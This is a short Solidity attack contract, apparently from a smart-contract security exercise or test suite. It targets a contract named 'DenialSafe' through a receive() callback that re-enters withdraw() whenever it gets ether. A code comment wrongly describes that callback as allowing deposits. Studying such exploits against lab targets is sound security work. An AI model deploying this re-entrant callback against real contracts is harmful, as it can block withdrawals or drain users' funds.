// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DenialSafe.sol";

contract DenialSafeAttack {
    DenialSafe public denial;

    constructor(DenialSafe _denial) {
        denial = _denial;
    }

    // allow deposit of funds
    receive() external payable {
        denial.withdraw();
    }
}
